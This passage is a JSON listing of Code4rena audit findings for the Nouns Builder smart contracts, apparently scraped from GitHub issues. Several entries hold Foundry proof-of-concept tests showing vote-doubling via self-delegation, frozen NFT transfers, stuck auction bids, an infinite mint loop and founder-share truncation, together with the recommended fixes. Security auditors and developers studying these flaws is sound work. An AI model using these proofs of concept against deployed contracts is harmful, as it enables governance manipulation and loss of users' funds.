auction.settleCurrentAndCreateNewAuction();     }      function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {         // An especially malicious user may acquire multiple tokens         // before doubling their voting power through this exploit.         mintVoter1();         mintToken(3);         mintToken(4);         mintToken(5);         mintToken(6);          assertEq(token.getVotes(address(voter1)), 5);          vm.prank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 10);     } ```"}, {"title": "Unintended zero wallet addresses results in loss of tokens for Founders", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/410", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Unintended zero wallet addresses results in loss of tokens for Founders"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/409", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/399", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/396", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/386", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/384", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/383", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/382", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/381", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Highest bid in first auction can get irretreivably stuck in the protocol", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254   # Vulnerability details  ## Impact If the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.  ## Proof of Concept In a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.  If the first auction in such a protocol is paused and unpaused, the check for `if (auction.tokenId == 0)` will pass and `_createAuction()` will automatically be called, minting the next token and starting a new auction based on token #1.  The result is that `highestBid` and `highestBidder` are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.  The following test confirms this finding:  ```solidity function test_PauseAndUnpauseInFirstAuction() public {     address bidder1 = vm.addr(0xB1);     address bidder2 = vm.addr(0xB2);      vm.deal(bidder1, 100 ether);     vm.deal(bidder2, 100 ether);      console.log(\"Deploying with no founder pct...\");     deployMockWithEmptyFounders();      console.log(\"Unpausing...\");     vm.prank(founder);     auction.unpause();      console.log(\"Bidder makes initial bid.\");     vm.prank(bidder1);     auction.createBid{ value: 1 ether }(0);     (uint256 tokenId_, uint256 highestBid_, address highestBidder_,,,) = auction.auction();     console.log(\"Currently bidding for ID \", tokenId_);     console.log(\"Highest Bid: \", highestBid_, \". Bidder: \", highestBidder_);     console.log(\"Contract Balance: \", address(auction).balance);     console.log(\"--------\");      console.log(\"Pausing and unpausing auction house...\");     vm.startPrank(address(treasury));     auction.pause();     auction.unpause();     vm.stopPrank();      console.log(\"Bidder makes new bid.\");     vm.prank(bidder2);     auction.createBid{ value: 0.5 ether }(1);     (uint256 tokenId2_, uint256 highestBid2_, address highestBidder2_,,,) = auction.auction();     console.log(\"Currently bidding for ID \", tokenId2_);     console.log(\"Highest Bid: \", highestBid2_, \". Bidder: \", highestBidder2_);     console.log(\"Contract Balance: \", address(auction).balance); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Remove the block in `unpause()` that transfers ownership and creates an auction if `auction.tokenId == 0` and trigger those actions manually in the deployment flow."}, {"title": "ERC721Votes's delegation disables NFT transfers and burning", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268   # Vulnerability details  If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.  The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.  As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.  ## Proof of Concept  Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  _moveDelegateVotes() will set her votes to `0` as `_from == Alice` and `prevTotalVotes = _amount = balanceOf(Alice)` (as _afterTokenTransfer() incremented Alice's vote balance on each mint to her):  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217  ```solidity     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as `_afterTokenTransfer` will revert on `_moveDelegateVotes`'s attempt to move `1` vote from `Alice` to `_to`, while `checkpoints[Alice][nCheckpoints - 1].votes` is `0`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1); ```  ## Recommended Mitigation Steps  The root issue is _afterTokenTransfer() dealing with Alice instead of Alice's delegate.  Consider including delegates() call as a fix:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient -       _moveDelegateVotes(_from, _to, 1); +       _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  As `delegates(address(0)) == address(0)` the burning/minting flow will persist:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) external view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/363", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/362", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "No control over timeBuffer could make that the first bid of each auction would make the auction end", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/359", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327   # Vulnerability details  ## Impact There is an [unchecked block](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150) that in case timeBuffer is sufficiently large, would make the sum overflow and set the endTime of the auction in the past, making the auction end automatically. The developers are aware of this, that's why they have [this comment](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146). But I think it's not a matter of realistically overflowing, it could be set to a value large enough by mistake. It's not worth it to not validate the value of the time buffer, because the consequences could be devastating.  The best option would be to validate in function [setTimeBuffer](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327) that the timeBuffer cannot be set to a large value.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change function setTimeBuffer with this:  ```     function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         require(_timeBuffer < 31536000, \"TimeBuffer: too big\");          settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     } ``` I supposed that **timeBuffer** should be less than one year (probably much less), so I compared here with the number of seconds in a year."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/357", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/353", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "`Auction:createBid`: can take a bid with the same `highestBid` if (highestBid * minBidIncrement < 100)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/349", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L123   # Vulnerability details  ## Impact  A bidder can outbid previous bid with the same value, if the `(previous bid * minBidIncrement < 100)`.  ## Proof of Concept  ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum 123             if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();  331     function setMinimumBidIncrement(uint256 _percentage) external onlyOwner { 332         settings.minBidIncrement = SafeCast.toUint8(_percentage); 333 334         emit MinBidIncrementPercentageUpdated(_percentage); 335     } ```  When the `minBid` (defined in the line 119) is the same as the current `highestBid`, one can call `createBid` with the same value as the current `highestBid` (line 123). It means that the new bidder will get the Bid, even though the previous bidder has the same bid and was earlier. The `minBid` can be the same as the `highesBid` when `highestBid * minBidIncrement` is less than 100. So either the `highestBid` or `minBinIncrement` is too small, a bidder can overbid the precious one with the same amount of value.  The first bid should be higher or equal to the `reservePrice`. However, there is no safe guard against setting small `reservePrice` and `minBidIncrement`.  For example, let's say the `settings.minBidIncrement` is set to zero. Alice called `createBid` with 1 ether and is the current highestBidder with the `highestBid` of 1 ether. Bob calls `createBid` with 1 ether. The `minBid` in the line 119 will be 1ether as `minBidIncrement` is set to zero. In the line 123 the `msg.value` is 1 ether is the same as `minBid` therefore it will not revert. And now Bob is the `highestBidder` even though he bid the same value after Alice.  ## Tools Used  None  ## Recommended Mitigation Steps  Revert if the `msg.value` is the same as the `minBid`: ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum -   if (msg.value < minBid) revert MINIMUM_BID_NOT_MET(); +  if (msg.value <= minBid) revert MINIMUM_BID_NOT_MET(); ```  <!-- zzzitron M00 -->  "}, {"title": "`Token:mint`: infinite loop if the founders' shares sum up to 100", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179   # Vulnerability details  ## Impact  The Token as well as Auction cannot be used if the sum of `ownershipPct` is 100  ## Proof of Concept  ```solidity     function test_poc_mintforever() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          Founder memory founder;          unchecked {             for (uint256 i; i < 100; ++i) {                 founder = token.getScheduledRecipient(i);                  if (i % 2 == 0) assertEq(founder.wallet, otherUsers[0]);                 else assertEq(founder.wallet, otherUsers[1]);             }         }  // // commented out as it will not stop //         vm.prank(otherUsers[0]); //         auction.unpause();      } ```  In the proof of concept, there are two founders and they both share 50% of ownership. If the `Auction` should be `unpause`d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.  ```solidity // Token.sol  143     function mint() external nonReentrant returns (uint256 tokenId) { 144         // Cache the auction address 145         address minter = settings.auction; 146 147         // Ensure the caller is the auction 148         if (msg.sender != minter) revert ONLY_AUCTION(); 149 150         // Cannot realistically overflow 151         unchecked { 152             do { 153                 // Get the next token to mint 154                 tokenId = settings.totalSupply++; 155 156                 // Lookup whether the token is for a founder, and mint accordingly if so 157             } while (_isForFounder(tokenId)); 158         } 159 160         // Mint the next available token to the auction house for bidding 161         _mint(minter, tokenId); 162     }  177     function _isForFounder(uint256 _tokenId) private returns (bool) { 178         // Get the base token id 179         uint256 baseTokenId = _tokenId % 100; 180 181         // If there is no scheduled recipient: 182         if (tokenRecipient[baseTokenId].wallet == address(0)) { 183             return false; 184 185             // Else if the founder is still vesting: 186         } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) { 187             // Mint the token to the founder 188             _mint(tokenRecipient[baseTokenId].wallet, _tokenId); 189 190             return true; 191 192             // Else the founder has finished vesting: 193         } else { 194             // Remove them from future lookups 195             delete tokenRecipient[baseTokenId]; 196 197             return false; 198         } 199     } ```  In the `Token::mint`, there is a while loop which will keep looping as long as `_isForFounder` returns true. The `_isForFounder` function will return true is the given `_tokenId`'s recipient is still vesting. However, to check the recipient it is checking the `baseTokenId` which is `_tokenId % 100` (in line 179 above snippet). Which means, if the `tokenRecipient` of 0 to 99 are currently vesting, it will keep returning true and the while loop in the `mint` function will not stop. The `tokenRecipient` was set in the `_addFounders` and if the sum of all founders' ownership percent is 100, the `tokenRecipient` will be filled up to 100.   ## Tools Used  None  ## Recommended Mitigation Steps  use `_tokenId` instead of `baseTokenId`.  <!-- zzzitron H01 -->  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/346", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Previous highest bidder can scare away or make current bidder pay unnecessary cost", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/341", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Previous highest bidder can scare away or make current bidder pay unnecessary cost"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/338", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/336", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Precision is not enough for proposalThreshold and quorum. Collections with at least 20000 NFTs in total supply may have some trouble.", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "Precision is not enough for proposalThreshold and quorum. Collections with at least 20000 NFTs in total supply may have some trouble."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/332", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/331", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/328", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/326", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/322", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/320", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/316", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/315", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Truncation in casting can lead to a founder receiving all the base tokens", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88   # Vulnerability details  ## Impact The initialize function of the `Token` contract receives an array of `FounderParams`, which contains the ownership percent of each founder as a `uint256`. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in `uint8`. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, `uint256` value.  This can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).  ## Proof of Concept To verify this bug I created a foundry test. You can add it to the test folder and run it with `forge test --match-test testFounderGettingAllBaseTokensBug`.  This test deploys a token implementation and an `ERC1967` proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the `totalOwnership` variable is a `uint8`, and when truncating 256 to fit in a `uint8` it will turn to 0, so this check will pass.  After the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn't get any base tokens at all.  What actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.  This happens because `schedule`, which is equal to `100 / founderPct`, will be zero (`100 / 256 == 0` due to uint div operation), and the base token id won't be updated in `(baseTokenId += schedule) % 100` (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the `_getNextTokenId`, where it will be incremented by 1.  This exploit can work as long as the sum of the percents modulo 256 (truncation to `uint8`) is not more than 100.  ```sol // The relative path of this file is \"test/FounderGettingAllBaseTokensBug.t.sol\"  // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { Test } from \"forge-std/Test.sol\";  import { IManager } from \"../src/manager/Manager.sol\"; import { IToken, Token } from \"../src/token/Token.sol\";  import { TokenTypesV1 } from \"../src/token/types/TokenTypesV1.sol\";  import { ERC1967Proxy } from \"../src/lib/proxy/ERC1967Proxy.sol\";  contract FounderGettingAllBaseTokensBug is Test, TokenTypesV1 {      Token imp;     address proxy;          function setUp() public virtual {         // Deploying the implementation and the proxy         imp = new Token(address(this));         proxy = address(new ERC1967Proxy(address(imp), \"\"));     }      function testFounderGettingAllBaseTokensBug() public {          IToken token = IToken(proxy);          address chadFounder = address(0xdeadbeef);         address betaFounder = address(0xBBBBBBBB); // beta          // Creating 2 founders with `ownershipPct = 256`         IManager.FounderParams[] memory founders = new IManager.FounderParams[](2);         founders[0] = IManager.FounderParams({             wallet: chadFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });         founders[1] = IManager.FounderParams({             wallet: betaFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });          // Initializing the proxy with the founders data         token.initialize(                founders,              // we don't care about these             abi.encode(\"\", \"\", \"\", \"\", \"\"),             address(0),             address(0)         );          // Asserting that the chad founder got all the base token ids         // (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)         for (uint i; i < 100; ++i) {             assertEq(token.getScheduledRecipient(i).wallet == chadFounder, true);         }          // Run with `forge test --match-test testFounderGettingAllBaseTokensBug`         // Results:         //      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)         // Great success     } ```  ## Tools Used Manual audit & foundry for the PoC  ## Recommended Mitigation Steps Don't truncate the `founderPct` variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than `type(uint8).max` (or less or equal to 100). After applying this fix and running the test again, the result is: ``` [FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674) ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/302", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/297", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/289", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/283", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/278", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/276", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/270", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Founders can receive less tokens that expected", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269", "labels": ["bug", "duplicate", "2 (Med Risk)", "disagree with severity"], "target": "2022-09-nouns-builder-findings", "body": "Founders can receive less tokens that expected"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/266", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/263", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/261", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/260", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/258", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/257", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Upgrade of Manager.sol inconsistent with interface and other contracts", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/256", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol#L209   # Vulnerability details  ### Impact  [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) implements a different pattern to contract upgradeability only performing an authorisation check and not ensuring that the new Manager implementation has been registered as an upgrade via `isRegisteredUpgrade()`.  The impact is that an upgrade to the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) does not require a two step approval and be registered via `registerUpgrade()` . Additionally there is no notification event that the Manager implementation has been registered for an upgrade i.e. `UpgradeRegistered`.  In this respect the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) contract has a different implementation to other contracts that make up the DAO (e.g. [Token.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L305) and [Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L618)) and doesn\u2019t follow the process described in the [IManager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/IManager.sol) interface, namely that upgrades are registered via `registerUpgrade()`. and therefore emit the `UpgradeRegistered` event for transparency and monitoring/auditing.  ### Proof of Concept  When comparing `_authorizeUpgrade()` in Manager.sol and Token.sol the implementations differ;  ```solidity // Manager.sol function _authorizeUpgrade(address _newImpl) internal override onlyOwner {}  // Token.sol function _authorizeUpgrade(address _newImpl) internal view override {   // Ensure the caller is the shared owner of the token and metadata renderer   if (msg.sender != owner()) revert ONLY_OWNER();    // Ensure the implementation is valid   if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  When the Manager.sol implementation is updated it **will not** check whether a new implementation has been registered. The `upgradeTo()` function in [UUPS.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/proxy/UUPS.sol) will be called checking authorisation and then upgrading the implementation;  ```solidity // UUPS.sol function upgradeTo(address _newImpl) external onlyProxy {     _authorizeUpgrade(_newImpl);     _upgradeToAndCallUUPS(_newImpl, \"\", false); } ```  However unlike Token.sol, Manager.sol performs no checks as to whether the implementation has been registered only checking that the calling entity is the owner.  ### Tools Used  Vim  ### Recommended Remediation Steps  To make Manager.sol consistent with the IManager interface and other contracts in the DAO it should have the same functionality implemented in `_authoriseUpgrade()` (see below);  ```solidity function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {   if (!this.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  As well as this the [NounsBuilderTest.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/test/utils/NounsBuilderTest.sol) should be updated to perform `.registerUpgrade()` before `.upgradeTo()`. For example;  ```solidity // L71 of NounsBuilderTest.sol 